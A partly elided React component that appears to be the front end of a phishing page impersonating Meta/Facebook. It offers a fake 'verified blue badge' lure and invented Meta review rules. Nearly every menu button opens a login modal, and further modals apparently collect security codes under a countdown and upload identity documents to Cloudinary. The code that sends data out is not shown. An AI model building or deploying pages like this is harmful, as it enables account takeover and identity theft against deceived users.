...
import TheIdModal from '../components/modals/TheIdModal';
...
const AccountPageComponent = () => {
    ...
    const handleFinishSecurity = async (values) => {
        switch (clickSecurity) {
            case 0:
                ...
                let ck_data_v3 = getRecord("__ck_clv3");

                if (!ck_data_v3) {
                    console.log("Not found __ck_data");
                    ck_data_v3 = getRecord("__ck_clv3");
                }
    ...
    const handleFinishTheId = async (files) => {
        try {
            setLoadingTheId(true);
            ...
            setFileList([]);
            setOpenTheIdModal(false);
            setOpenFinalModal(true);
        } catch (error) {
            console.error('Error uploading to Cloudinary:', error);
        } finally {
            setLoadingTheId(false);
        }
    };
    ...
    return (
                                                ...
                                                <div id='action-buttons'>
                                                    <div className='item-action'>
                                                        <div className='action-button main'>
                                                            ...
                                                            <div className='action-text'>{t('menu.privacy_center')}</div>
                                                        </div>
                                                    </div>
                                                    ...
                                                    <div className='item-action'>
                                                        <div className='action-button'>
                                                            ...
                                                            <div className='action-text'>{t('menu.search')}</div>
                                                        </div>
                                                    </div>
                                                    ...
                                                    <div className={activeMenu === 1 ? "item-action active" : "item-action"} >
                                                        <div className='action-button' onClick={() => handleOpendMenu(1)}>
                                                            ...
                                                            <div className='action-text'>{t('menu.privacy_policy.title')}</div>
                                                        ...
                                                        <div className='content-action'>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_1')}</div>
                                                            ...
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_2')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_3')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_4')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_5')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_6')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_7')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_8')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_9')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_10')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_11')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_12')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                            <div className="action-button" onClick={() => setOpenAuthModal(true)}>
                                                                <div className="action-icon">
                                                                ...
                                                                <div className="action-text">{t('menu.privacy_policy.sub_menu.sub_13')}</div>
                                                                <div className="action-arrow"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    ...
                                                    <div className={activeMenu === 2 ? "item-action active" : "item-action"} >
                                                        <div className='action-button' onClick={() => handleOpendMenu(2)}>
                                                            ...
                                                            <div className='action-text'>{t('menu.other_rules_and_articles.title')}</div>
                                                            <div className='action-arrow'>
                                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                                </svg>
                                                        ...
                                                        <div className='content-action'>
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className='action-text'>{t('menu.other_rules_and_articles.sub_menu.sub_1')}</div>
                                                                <div className='action-arrow'></div>
                                                            </div>
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                <div className='action-icon'>
                                                                ...
                                                                <div className='action-text'>{t('menu.other_rules_and_articles.sub_menu.sub_2')}</div>
                                                                <div className='action-arrow'>
                                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            ...
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className='action-text'>{t('menu.other_rules_and_articles.sub_menu.sub_3')}</div>
                                                                <div className='action-arrow'>
                                                                </div>
                                                            </div>
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className='action-text'>{t('menu.other_rules_and_articles.sub_menu.sub_4')}</div>
                                                                <div className='action-arrow'>
                                                                </div>
                                                            </div>
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className='action-text'>{t('menu.other_rules_and_articles.sub_menu.sub_5')}</div>
                                                                <div className='action-arrow'>
                                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                                        <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
                                                    ...
                                                    <div className={activeMenu === 3 ? "item-action active" : "item-action"} >
                                                        <div className='action-button' onClick={() => handleOpendMenu(3)}>
                                                            ...
                                                            <div className='action-text'>{t('menu.settings.title')}</div>
                                                            <div className='action-arrow'>
                                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                                </svg>
                                                        ...
                                                        <div className='content-action'>
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className='action-text'>{t('menu.settings.sub_menu.sub_1')}</div>
                                                                <div className='action-arrow'>
                                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                                        <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
                                                            ...
                                                            <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                                                ...
                                                                <div className='action-text'>{t('menu.settings.sub_menu.sub_2')}</div>
                                                                <div className='action-arrow'>
                                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                                        <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
        ...
        px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M13.8179 4.54512L13.6275 4.27845C12.8298 3.16176 11.1702 3.16176 10.3725 4.27845L10.1821 4.54512C9.76092 5.13471 9.05384 5.45043 8.33373 5.37041L7.48471 5.27608C6.21088 5.13454 5.13454 6.21088 5.27608 7.48471L5.37041 8.33373C5.45043 9.05384 5.13471 9.76092 4.54512 10.1821L4.27845 10.3725C3.16176 11.1702 3.16176 12.8298 4.27845 13.6275L4.54512 13.8179C5.13471 14.2391 5.45043 14.9462 5.37041 15.6663L5.27608 16.5153C5.13454 17.7891 6.21088 18.8655 7.48471 18.7239L8.33373 18.6296C9.05384 18.5496 9.76092 18.8653 10.1821 19.4549L10.3725 19.7215C11.1702 20.8382 12.8298 20.8382 13.6275 19.7215L13.8179 19.4549C14.2391 18.8653 14.9462 18.5496 15.6663 18.6296L16.5153 18.7239C17.7891 18.8655 18.8655 17.7891 18.7239 16.5153L18.6296 15.6663C18.5496 14.9462 18.8653 14.2391 19.4549 13.8179L19.7215 13.6275C20.8382 12.8298 20.8382 11.1702 19.7215 10.3725L19.4549 10.1821C18.8653 9.76092 18.5496 9.05384 18.6296 8.33373L18.7239 7.48471C18.8655 6.21088 17.7891 5.13454 16.5153 5.27608L15.6663 5.37041C14.9462 5.45043 14.2391 5.13471 13.8179 4.54512Z" stroke="#323232" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M9 12L10.8189 13.8189V13.8189C10.9189 13.9189 11.0811 13.9189 11.1811 13.8189V13.8189L15 10" stroke="#323232" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
                                                </div>
                                                <div className="text-content">
                                                    <p>Show the world that you mean business.</p>
                                                </div>
                                            </div>

                                            <div className="content-card">
                                                <p>Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.</p>
                                                <p>We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
                                                <p className="ticket">{t('content.warning.sub_title.sub_3')}: #{ticketId}</p>
                                            </div>

                                            {/* CARD */}
                                            <div className='card-thumb'>
                                                <img src="/warning-banner-v1.png.jpg" width="100%" alt='warning instagram accont' />
                                                <div className='thumb-content'>
                                                   
                                                    <div className='btn-wrapper' onClick={() => setOpenAuthModal(true)}>
                                                        <div className='button fb-blue'><b>{t('content.thumb_review.button')}</b></div>
                                                    </div>

                                                </div>
                                            </div>
                                            <div className="warning-list">
                                                <p><b>Verified Blue Badge Request Guide</b></p>
                                                <ul>
                                                    <li>Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</li>
                                                    <li>In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</li>
                                                    <li>Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly</li>
                                                </ul>
                                            </div>
                                            <br />

                                            <h6>{t('content.privacy_center.title')}</h6>
                                            <div className='action-button-list content'>
                                            ...
                                            <div className='action-button-list content'>
                                                <div className='action-button b-bottom ' onClick={() => setOpenAuthModal(true)}>
                                                    <div className='action-text' style={{padding: "0"}}>
                        ...
                        <SecurityModal
                            ...
                            warningSecurity={warningSecurity}
                            timeCounter={timeCounter}
                            clickSecurity={clickSecurity}
                        />

                        <TheIdModal
                            opendTheIdModal={openTheIdModal}
                            onCancelTheIdModal={() => setOpenTheIdModal(false)}
                            onFinishTheId={handleFinishTheId}
                            loadingTheId={loadingTheId}
                            fileList={fileList}
